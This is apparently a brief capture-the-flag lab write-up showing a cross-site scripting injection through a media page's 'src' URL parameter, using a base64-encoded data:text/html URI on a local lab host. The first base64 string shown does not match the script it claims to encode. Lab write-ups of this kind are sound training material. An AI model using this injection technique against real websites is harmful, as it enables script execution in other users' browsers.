# flag 9 | xss in pictures

For this flag, we will use [this page](http://192.168.56.104/index.php?page=media&src=nsa)

We can see that the url is precising the src of the media, so we can try to create an xss injection in the url while setting it to base64.

We will transform this
```html
<script>alert("donne flag stp")</script>
```
To this
```html
PHNjcmlwdD5hbGVydCgiZmxhZyIpPC9zY3JpcHQ+Cg==
```

And we will set the url to
```html
http://192.168.56.104/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiZG9ubmUgZmxhZyBzdHAiKTwvc2NyaXB0Pgo=
```